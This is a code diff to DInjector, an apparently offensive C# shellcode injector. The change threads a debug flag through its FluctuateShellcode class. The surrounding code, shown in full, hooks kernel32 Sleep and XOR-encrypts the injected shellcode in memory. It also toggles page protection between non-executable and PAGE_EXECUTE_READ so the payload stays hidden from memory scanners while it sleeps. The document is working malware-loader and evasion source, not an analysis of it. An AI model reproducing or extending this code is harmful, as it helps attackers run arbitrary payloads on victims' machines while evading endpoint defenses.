@@ -9,7 +9,7 @@ namespace DInjector
 {
     class CurrentThread
     {
-        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate)
+        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate, bool debug = false)
         {
             uint allocProtect = 0, newProtect = 0;
             string strAllocProtect = "", strNewProtect = "";
@@ -83,7 +83,7 @@ namespace DInjector
                 #endregion
             }
 
-            var fs = new FluctuateShellcode(fluctuate, baseAddress, shellcode.Length);
+            var fs = new FluctuateShellcode(fluctuate, baseAddress, shellcode.Length, debug);
             if (fluctuate != 0)
             {
                 var strFluctuate = "PAGE_READWRITE";
@@ -253,8 +253,9 @@ namespace DInjector
         readonly IntPtr shellcodeAddress;
         readonly int shellcodeLength;
         readonly byte[] xorKey;
+        readonly bool printDebug;
 
-        public FluctuateShellcode(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen)
+        public FluctuateShellcode(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
         {
             sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "Sleep");
             sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));
@@ -279,6 +280,8 @@ namespace DInjector
             shellcodeAddress = shellcodeAddr;
             shellcodeLength = shellcodeLen;
             xorKey = GenerateXorKey();
+
+            printDebug = debug;
         }
 
         ~FluctuateShellcode()
@@ -292,13 +295,13 @@ namespace DInjector
         void SleepDetour(uint dwMilliseconds)
         {
             DisableHook();
-            ProtectMemory(fluctuateWith);
+            ProtectMemory(fluctuateWith, printDebug);
             XorMemory();
 
             sleepOrig(dwMilliseconds);
 
             XorMemory();
-            ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
+            ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ, printDebug);
             EnableHook();
         }
 
@@ -420,7 +423,7 @@ namespace DInjector
             #endregion
         }
 
-        void ProtectMemory(uint newProtect)
+        void ProtectMemory(uint newProtect, bool printDebug)
         {
             IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
             IntPtr protectAddress = shellcodeAddress;
@@ -434,8 +437,11 @@ namespace DInjector
                 newProtect,
                 ref oldProtect);
 
-            if (ntstatus == NTSTATUS.Success) //{ }
-                Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
+            if (ntstatus == NTSTATUS.Success)
+            {
+                if (printDebug)
+                    Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
+            }
             else
                 throw new Exception($"(FluctuateShellcode) [-] NtProtectVirtualMemory, newProtect: {ntstatus}");
         }
@@ -444,7 +450,10 @@ namespace DInjector
         {
             byte[] data = new byte[shellcodeLength];
             Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
-            for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
+
+            for (var i = 0; i < data.Length; i++)
+                data[i] ^= xorKey[i]; // one-time pad
+
             Marshal.Copy(data, 0, shellcodeAddress, data.Length);
         }
 
